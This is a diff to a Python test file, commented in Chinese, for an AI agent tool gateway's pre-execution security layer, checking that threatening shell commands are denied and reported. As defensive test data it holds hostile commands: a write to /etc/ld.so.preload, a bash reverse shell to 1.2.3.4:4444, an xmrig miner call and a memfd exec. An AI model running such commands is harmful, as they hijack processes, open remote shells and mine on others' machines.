@@ -40,6 +40,10 @@ from trimum_core.tool_gateway import ToolGateway  # noqa: E402
 from trimum_core.workflow_runtime import WorkflowRuntime  # noqa: E402
 
 
+#: L4 的「必拦」样例命令：**写入**劫持文件（`cat` 读它不算劫持，见签名收敛）
+BLOCKED_COMMAND = "echo evil >> /etc/ld.so.preload"
+
+
 def _request(command: str) -> ExecuteRequest:
     return ExecuteRequest(
         tool=ToolType.SHELL,
@@ -88,7 +92,7 @@ class TestLayer4Deny:
     async def test_command_is_blocked_by_the_monitor(self, wired):
         gateway, recorder, _tmp = wired
 
-        resp = await gateway.execute(_request("cat /etc/ld.so.preload"))
+        resp = await gateway.execute(_request(BLOCKED_COMMAND))
         await asyncio.sleep(0.05)
 
         assert resp.status == "denied"
@@ -100,13 +104,13 @@ class TestLayer4Deny:
     async def test_flat_monitor_result_is_broadcast_with_the_scan_context(self, wired):
         gateway, recorder, _tmp = wired
 
-        await gateway.execute(_request("cat /etc/ld.so.preload"))
+        await gateway.execute(_request(BLOCKED_COMMAND))
         await asyncio.sleep(0.05)
 
         assert len(recorder[EVENT_SEC_MONITOR]) == 1
         payload = recorder[EVENT_SEC_MONITOR][0].payload
         assert payload["threat_name"] == "ld_preload"
-        assert payload["command"] == "cat /etc/ld.so.preload"
+        assert payload["command"] == BLOCKED_COMMAND
         assert payload["agent_id"] == "tester"
         assert payload["layer_hit"] == "L4"
         assert payload["pid"] == 0, "L4 是执行前闸门，不能拿 daemon 自己的 PID 冒充"
@@ -115,7 +119,7 @@ class TestLayer4Deny:
     async def test_executor_audits_and_notifies_and_triggers_the_script(self, wired):
         gateway, recorder, tmp_path = wired
 
-        await gateway.execute(_request("cat /etc/ld.so.preload"))
+        await gateway.execute(_request(BLOCKED_COMMAND))
         await asyncio.sleep(0.05)
 
         assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_BLOCKED]] == ["ld_preload"]
@@ -130,7 +134,7 @@ class TestLayer4Deny:
         """契约闭环：L4 发出去的载荷真的能让内置剧本条件成立。"""
         gateway, recorder, _tmp = wired
 
-        await gateway.execute(_request("cat /etc/ld.so.preload"))
+        await gateway.execute(_request(BLOCKED_COMMAND))
         await asyncio.sleep(0.05)
 
         payload = recorder[EVENT_SEC_MONITOR][0].payload
@@ -144,7 +148,40 @@ class TestLayer4Deny:
 
 
 class TestLayer4NonDeny:
-    """非 DENY 类威胁（CONFIRM / FREEZE / ISOLATE）：今天只响应不拦，行为已锁。"""
+    """非 DENY 类威胁的处置：拦截类（KILL / FREEZE / ISOLATE）在执行前等价于拒绝，
+    CONFIRM 类转成确认（非交互路径放行 + 广播）。"""
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "command, threat_name, workflow",
+        [
+            (
+                "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
+                "reverse_shell",
+                "threat-revshell-cleanup",
+            ),
+            ("xmrig --donate-level 1", "crypto_miner", "threat-crypto-scan"),
+            ("bash /proc/self/fd/3", "memfd_exec", "threat-memfd-scan"),
+        ],
+    )
+    async def test_kill_freeze_isolate_are_blocked_before_execution(
+        self, wired, command, threat_name, workflow
+    ):
+        """执行前闸门没有子进程可冻/杀（pid=0）——「不让它跑」就是等价的响应。"""
+        gateway, recorder, _tmp = wired
+
+        resp = await gateway.execute(_request(command))
+        await asyncio.sleep(0.05)
+
+        assert resp.status == "denied"
+        assert resp.exit_code == 137
+        assert resp.risk.value == "critical"
+        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_MONITOR]] == [
+            threat_name
+        ]
+        assert [event.payload["workflow_name"] for event in recorder[EVENT_WORKFLOW_TRIGGER]] == [
+            workflow
+        ]
 
     @pytest.mark.asyncio
     async def test_confirm_threat_is_reported_but_the_command_still_runs(self, wired):
@@ -176,20 +213,46 @@ class TestLayer4QuietPath:
             assert recorder[key] == [], key
         assert not (tmp_path / "security.log").exists()
 
-    @pytest.mark.asyncio
-    async def test_gateway_without_monitor_skips_layer4(self):
-        """没装监控的网关（CLI / agent loop）就没有 L4：同一条威胁命令只会照常往下走。
 
-        这条断言是**缺口陈述**而不是赞美：L1 策略放行 `cat`、L2.5 也放行，挡下
-        ld_preload 的只有 L4。命令本身跑不跑得起来取决于宿主（Windows 没有 `cat`），
-        所以这里只断言「没有被拦」+「没有 monitor_result」。
-        """
+class TestLayer4DefaultWiring:
+    """L4 不再依赖「谁记得注入监控」：任何入口建出来的网关都自带（scan-only 兜底）。
+
+    以前只有 daemon 的网关挂了 SecMonitor，`trm ask` / `trm exec` / workflow 的兜底
+    网关都没有 L4 —— 命中威胁既不广播也不阻断（缺口）。现在没被注入时网关自建
+    ``SecurityRuntime.local()``：同一条事件链，只是审计不落盘。
+    """
+
+    @pytest.mark.asyncio
+    async def test_plain_gateway_blocks_and_broadcasts_without_a_daemon(self):
         bus = EventBus()
         recorder = _Recorder(bus)
-        gateway = ToolGateway(event_bus=bus)
+        gateway = ToolGateway(event_bus=bus)  # 不注入 monitor：模拟 `trm ask` / `trm exec`
 
-        resp = await gateway.execute(_request("cat /etc/ld.so.preload"))
+        assert gateway.sec_monitor is not None
+        resp = await gateway.execute(_request(BLOCKED_COMMAND))
         await asyncio.sleep(0.05)
 
-        assert resp.status != "denied"
-        assert recorder[EVENT_SEC_MONITOR] == []
+        assert resp.status == "denied"
+        assert resp.exit_code == 137
+        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_MONITOR]] == [
+            "ld_preload"
+        ]
+        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_BLOCKED]] == [
+            "ld_preload"
+        ]
+
+    def test_local_pipeline_never_writes_the_home_audit_log(self):
+        """裸 CLI 进程不该往 ~/.trimum 写安全审计（那是 daemon 的审计链）。"""
+        gateway = ToolGateway()
+
+        assert gateway.sec_executor.audit.audit_path is None
+
+    def test_layer4_can_be_switched_off_explicitly(self):
+        gateway = ToolGateway(layer4=False, event_bus=EventBus())
+
+        assert gateway.sec_monitor is None
+
+    def test_workflow_runtime_fallback_gateway_also_carries_layer4(self):
+        runtime = WorkflowRuntime(EventBus())
+
+        assert runtime._ensure_gateway().sec_monitor is not None
